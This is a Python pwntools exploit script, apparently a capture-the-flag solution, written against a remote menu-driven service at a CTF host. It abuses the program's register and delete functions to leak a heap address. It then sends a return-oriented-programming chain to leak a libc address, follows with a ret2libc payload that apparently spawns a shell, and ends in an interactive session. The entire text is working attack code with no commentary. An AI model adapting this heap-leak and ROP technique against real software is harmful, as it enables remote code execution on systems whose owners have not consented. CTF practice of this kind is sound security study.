from pwn import *

#s = remote('10.1.1.10',1234)
s = remote('ctf.ikeeper.kr', 32677)
def reg(name,num,birth):
	s.recvuntil('>')
	s.sendline('1')
	s.recvuntil(':')
	s.send(name)
	s.recvuntil(':')
	s.send(num)
	s.recvuntil(':')
	s.send(birth)
def delete(index):
	s.recvuntil('>')
	s.sendline('3')
	s.recvuntil('index :')
	s.sendline(str(index))
def show():
	s.recvuntil('>')
	s.sendline('2')
gadget = 0x0804921c # pop ebx ; pop esi ; pop edi ; pop ebp ; ret
reg("A","B","C")
reg("A","B","C"*0x10+p32(0x080489E0))
reg("A","B","C")
delete(1)
show()
heap = u32(s.recvuntil('<<2>>')[0x74:0x78]) - 0x88
log.info("HEAP : 0x%x"%heap)
reg('A',"C","C")
reg('A',"C","C"*0x10+p32(0x41414141))
reg('A',"C","C")
delete(3)
s.recvuntil('>')
s.sendline('4')
s.recvuntil(':')
raw_input()
s.sendline('209')

dat = "A"*0x3c
dat += p32(0x08048560)
dat += p32(gadget+3)
dat += p32(0x0804AFC4)
dat += p32(0x08048550)
dat += p32(gadget+2)
dat += p32(0)
dat += p32(heap+0xc00)
dat += p32(gadget+3)
dat += p32(heap+0xc00)
dat += p32(0x0804888C)
s.send(dat)
libc = u32(s.recvuntil('\xb7')[-4:]) - 0x76de0

log.info("LIBC : 0x%x"%libc)
time.sleep(0.5)
dat = p32(0x41414141)
dat += p32(libc+0x00040310)
dat += p32(0xdeadbeef)
dat += p32(libc+0x16084c)
s.send(dat)
'''
dat = ""
dat += p32(libc+0x3ada0)
dat += p32(0xdeadbeef)
dat += p32(libc+0x15b9ab)
s.send(dat)
libc = u32(s.recvuntil('\xf7')[-4:]) - 0x49670
log.info("LIBC : 0x%x"%libc)
time.sleep(0.5)
dat = p32(0x41414141)
dat += p32(libc+0x3ada0)
dat += p32(0xdeadbeef)
dat += p32(libc+0x15b9ab)
s.send(dat)
'''
s.interactive()
